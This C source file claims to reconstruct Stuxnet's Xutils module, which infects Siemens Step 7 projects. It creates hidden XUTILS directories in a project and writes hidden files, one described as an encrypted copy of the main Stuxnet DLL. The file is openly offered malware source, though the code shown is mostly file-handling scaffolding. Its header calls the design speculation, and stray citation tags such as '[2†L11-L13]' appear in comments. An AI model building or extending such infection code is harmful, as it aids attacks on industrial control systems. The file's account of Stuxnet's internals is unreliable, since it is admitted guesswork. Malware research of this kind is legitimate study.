/*
 * dropper/3. Xutils.c
 * Stuxnet Xutils - Step 7 Project Infection Module
 * Warning: Because there was nothing report what is Xutils so this is my speculation.
 * This file contains RCEd code extracted from Stuxnet binaries via disassembler
 * and decompilers.
 *
 * Based on research-virus/stuxnet (Christian Roggia)
 * https://github.com/research-virus/stuxnet
 */

#include <windows.h>
#include <stdio.h>

/* STUXNET_MAGIC identifies Stuxnet components in memory */
#define STUXNET_MAGIC           0x53545558

/* Xutils directory and file names */
#define XUTILS_DIR              L"XUTILS"
#define XUTILS_LISTEN_DIR       L"XUTILS\\listen"
#define XUTILS_LINKS_DIR        L"XUTILS\\links"

#define XR000000_MDX            L"XR000000.MDX"
#define S7000001_MDX            L"S7000001.MDX"
#define S7P00001_DBF            L"S7P00001.DBF"

/* Maximum path length for file operations */
#define XUTILS_MAX_PATH         260

/* Maximum buffer size */
#define XUTILS_BUFFER_SIZE      4096

/* Size of S7P00001.DBF - 90 bytes */
#define S7P00001_DBF_SIZE       90

typedef struct _XUTILS_CONTEXT {
    DWORD   dwMagic;            /* STUXNET_MAGIC */
    WCHAR   szProjectPath[XUTILS_MAX_PATH];  /* Path to the infected .s7p project */
    WCHAR   szXutilsPath[XUTILS_MAX_PATH];   /* Path to XUTILS directory */
    WCHAR   szListenPath[XUTILS_MAX_PATH];   /* Path to XUTILS\\listen */
    WCHAR   szLinksPath[XUTILS_MAX_PATH];    /* Path to XUTILS\\links */
    WCHAR   szXR000000[XUTILS_MAX_PATH];     /* Full path to XR000000.MDX */
    WCHAR   szS7000001[XUTILS_MAX_PATH];     /* Full path to S7000001.MDX */
    WCHAR   szS7P00001[XUTILS_MAX_PATH];     /* Full path to S7P00001.DBF */
    CRITICAL_SECTION csLock;                 /* Synchronization lock */
} XUTILS_CONTEXT, * PXUTILS_CONTEXT;

/* Global Xutils context */
static XUTILS_CONTEXT g_XutilsCtx = {0};

/*
 * Xutils_Initialize - Initializes the Xutils context
 */
DWORD Xutils_Initialize(VOID)
{
    if (g_XutilsCtx.dwMagic == STUXNET_MAGIC) {
        return 0; /* Already initialized */
    }

    ZeroMemory(&g_XutilsCtx, sizeof(XUTILS_CONTEXT));
    InitializeCriticalSection(&g_XutilsCtx.csLock);
    g_XutilsCtx.dwMagic = STUXNET_MAGIC;

    return 0;
}

/*
 * Xutils_Cleanup - Releases resources used by Xutils
 */
DWORD Xutils_Cleanup(VOID)
{
    if (g_XutilsCtx.dwMagic != STUXNET_MAGIC) {
        return -1;
    }

    DeleteCriticalSection(&g_XutilsCtx.csLock);
    ZeroMemory(&g_XutilsCtx, sizeof(XUTILS_CONTEXT));

    return 0;
}

/*
 * Xutils_SetProjectPath - Sets the path to the infected Step 7 project
 */
DWORD Xutils_SetProjectPath(LPCWSTR lpProjectPath)
{
    if (!lpProjectPath) {
        return -1;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    wcscpy_s(g_XutilsCtx.szProjectPath, XUTILS_MAX_PATH, lpProjectPath);

    /* Build XUTILS directory paths */
    wsprintfW(g_XutilsCtx.szXutilsPath, L"%s\\%s", lpProjectPath, XUTILS_DIR);
    wsprintfW(g_XutilsCtx.szListenPath, L"%s\\%s", lpProjectPath, XUTILS_LISTEN_DIR);
    wsprintfW(g_XutilsCtx.szLinksPath, L"%s\\%s", lpProjectPath, XUTILS_LINKS_DIR);

    /* Build full file paths */
    wsprintfW(g_XutilsCtx.szXR000000, L"%s\\%s", g_XutilsCtx.szListenPath, XR000000_MDX);
    wsprintfW(g_XutilsCtx.szS7000001, L"%s\\%s", g_XutilsCtx.szListenPath, S7000001_MDX);
    wsprintfW(g_XutilsCtx.szS7P00001, L"%s\\%s", g_XutilsCtx.szLinksPath, S7P00001_DBF);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_CreateDirectories - Creates the XUTILS directory structure
 */
DWORD Xutils_CreateDirectories(VOID)
{
    EnterCriticalSection(&g_XutilsCtx.csLock);

    /* Create XUTILS directory */
    CreateDirectoryW(g_XutilsCtx.szXutilsPath, NULL);
    SetFileAttributesW(g_XutilsCtx.szXutilsPath, FILE_ATTRIBUTE_HIDDEN);

    /* Create XUTILS\\listen directory */
    CreateDirectoryW(g_XutilsCtx.szListenPath, NULL);
    SetFileAttributesW(g_XutilsCtx.szListenPath, FILE_ATTRIBUTE_HIDDEN);

    /* Create XUTILS\\links directory */
    CreateDirectoryW(g_XutilsCtx.szLinksPath, NULL);
    SetFileAttributesW(g_XutilsCtx.szLinksPath, FILE_ATTRIBUTE_HIDDEN);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_WriteXR000000 - Writes the encrypted main DLL to XR000000.MDX
 *
 * This file contains an encrypted copy of the main Stuxnet DLL.
 * It acts as a decryptor and loader for the main DLL. [2†L11-L13][3†L6-L7]
 */
DWORD Xutils_WriteXR000000(PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    DWORD dwWritten;

    if (!pData || dwSize == 0) {
        return -1;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    hFile = CreateFileW(g_XutilsCtx.szXR000000, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_XutilsCtx.csLock);
        return -1;
    }

    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_WriteS7000001 - Writes encoded configuration to S7000001.MDX [3†L10]
 */
DWORD Xutils_WriteS7000001(PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    DWORD dwWritten;

    if (!pData || dwSize == 0) {
        return -1;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    hFile = CreateFileW(g_XutilsCtx.szS7000001, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_XutilsCtx.csLock);
        return -1;
    }

    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_WriteS7P00001 - Writes the 90-byte data file to S7P00001.DBF [1†L26-L27]
 *
 * This is a small data file used by Stuxnet for tracking or configuration.
 * Size: 90 bytes.
 */
DWORD Xutils_WriteS7P00001(PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    DWORD dwWritten;

    if (!pData) {
        return -1;
    }

    /* If size is not specified, default to 90 bytes */
    if (dwSize == 0) {
        dwSize = S7P00001_DBF_SIZE;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    hFile = CreateFileW(g_XutilsCtx.szS7P00001, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_XutilsCtx.csLock);
        return -1;
    }

    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_ReadXR000000 - Reads the encrypted main DLL from XR000000.MDX
 */
DWORD Xutils_ReadXR000000(PBYTE pBuffer, DWORD dwSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!pBuffer || dwSize == 0 || !pdwRead) {
        return -1;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    hFile = CreateFileW(g_XutilsCtx.szXR000000, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_XutilsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_ReadS7000001 - Reads encoded configuration from S7000001.MDX
 */
DWORD Xutils_ReadS7000001(PBYTE pBuffer, DWORD dwSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!pBuffer || dwSize == 0 || !pdwRead) {
        return -1;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    hFile = CreateFileW(g_XutilsCtx.szS7000001, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_XutilsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_ReadS7P00001 - Reads the data file from S7P00001.DBF
 */
DWORD Xutils_ReadS7P00001(PBYTE pBuffer, DWORD dwSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!pBuffer || dwSize == 0 || !pdwRead) {
        return -1;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    hFile = CreateFileW(g_XutilsCtx.szS7P00001, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_XutilsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_IsPresent - Checks if XUTILS directory exists in the project
 */
BOOL Xutils_IsPresent(VOID)
{
    DWORD dwAttrib;

    EnterCriticalSection(&g_XutilsCtx.csLock);

    dwAttrib = GetFileAttributesW(g_XutilsCtx.szXutilsPath);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
            (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

/*
 * Xutils_IsFilePresent - Checks if a specific Xutils file exists
 */
BOOL Xutils_IsFilePresent(LPCWSTR lpFileName)
{
    DWORD dwAttrib;

    if (!lpFileName) {
        return FALSE;
    }

    EnterCriticalSection(&g_XutilsCtx.csLock);

    dwAttrib = GetFileAttributesW(lpFileName);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}

/*
 * Xutils_DeleteAll - Deletes all Xutils files and directories
 */
DWORD Xutils_DeleteAll(VOID)
{
    EnterCriticalSection(&g_XutilsCtx.csLock);

    /* Delete files */
    DeleteFileW(g_XutilsCtx.szXR000000);
    DeleteFileW(g_XutilsCtx.szS7000001);
    DeleteFileW(g_XutilsCtx.szS7P00001);

    /* Remove directories */
    RemoveDirectoryW(g_XutilsCtx.szListenPath);
    RemoveDirectoryW(g_XutilsCtx.szLinksPath);
    RemoveDirectoryW(g_XutilsCtx.szXutilsPath);

    LeaveCriticalSection(&g_XutilsCtx.csLock);

    return 0;
}

/*
 * Xutils_GetPath - Returns the XUTILS directory path
 */
LPCWSTR Xutils_GetPath(VOID)
{
    return g_XutilsCtx.szXutilsPath;
}

/*
 * Xutils_GetListenPath - Returns the XUTILS\\listen directory path
 */
LPCWSTR Xutils_GetListenPath(VOID)
{
    return g_XutilsCtx.szListenPath;
}

/*
 * Xutils_GetLinksPath - Returns the XUTILS\\links directory path
 */
LPCWSTR Xutils_GetLinksPath(VOID)
{
    return g_XutilsCtx.szLinksPath;
}

/*
 * Xutils_GetXR000000Path - Returns the full path to XR000000.MDX
 */
LPCWSTR Xutils_GetXR000000Path(VOID)
{
    return g_XutilsCtx.szXR000000;
}

/*
 * Xutils_GetS7000001Path - Returns the full path to S7000001.MDX
 */
LPCWSTR Xutils_GetS7000001Path(VOID)
{
    return g_XutilsCtx.szS7000001;
}

/*
 * Xutils_GetS7P00001Path - Returns the full path to S7P00001.DBF
 */
LPCWSTR Xutils_GetS7P00001Path(VOID)
{
    return g_XutilsCtx.szS7P00001;
}